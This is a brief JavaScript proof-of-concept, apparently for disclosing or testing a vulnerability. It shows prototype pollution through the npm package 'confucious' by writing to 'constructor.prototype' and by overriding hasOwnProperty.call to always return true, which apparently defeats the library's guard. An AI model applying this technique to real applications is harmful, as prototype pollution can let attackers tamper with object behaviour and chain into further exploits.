Object.prototype.hasOwnProperty.call = () => true;
console.log({}.polluted);
const confucious = require('confucious');
confucious.set('constructor.prototype:polluted', 'yes');
console.log({}.polluted);